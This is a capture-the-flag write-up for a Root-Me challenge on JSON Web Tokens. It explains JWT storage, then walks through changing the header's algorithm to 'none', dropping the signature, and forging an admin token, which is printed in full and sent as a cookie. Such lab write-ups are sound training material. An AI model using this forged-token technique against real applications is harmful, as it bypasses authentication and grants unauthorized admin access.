# JSON Web Token (JWT) - Introduction(none, no key)

JWT is often used for front-end and back-end separation and can be used with the Restful API and is often used to build identity authentication mechanisms.

When a user enters his/her credentials, a post request is sent after which the credentials are validated. If they are a correct match then the user is presented with response having a JWT token

JWT is often stored in localstorage by frontend code

Local storage is a new feature of HTML5 that allows a web developer to store any information he wants in user’s browser using JavaScript.

***

How to attack

**firstly, send the get request to the appropriate api endpoint, to get the jwt key(if exposed)**

**and then decode the key with jwt.io**

**crack the secret key with jwt\_tool**

**Modify the algorithm to none**

Signature algorithm ensures that JWT is not modified by malicious users during transmission

But the alg field in the header can be changed to none Some JWT libraries support the none algorithm, that is, no signature algorithm. **When the alg is none, the backend will not perform signature verification.**

After changing alg to none, **remove the signature data from the JWT (only header + ‘.’ + payload + ‘.’) and submit it to the server.**

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf?\_gl=1_1ogwbhe_\_ga_NTM2MDg4NDI5LjE2NjExMzM0Njc._\_ga\_SRYSKX09J7\*MTY2MTkzMzkxNS4zMC4xLjE2NjE5MzM5MjQuMC4wLjA.

***

Solution

First, login as guest

Then, ctrl+shift+i to open developer's tool and then go to storage to see cookies (or use cookie editor browser extenstion)

watch the jwt

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk

now go to cyberchef, Base64 decode

{"typ":"JWT","alg":"HS256"}{"username":"guest"}..æg\`Ç^µÈ;.a.ée..À.Iö¬è....}3]ç² this gibberish part is signature data

then

base64 encode {"typ":"JWT","alg":"none"}

base 64 encode {"username":"admin"}

then add those with

a.b.

\=>

a: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

b: eyJ1c2VybmFtZSI6ImFkbWluIn0=

\=>

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.

\=>

send the newly crafted cookies
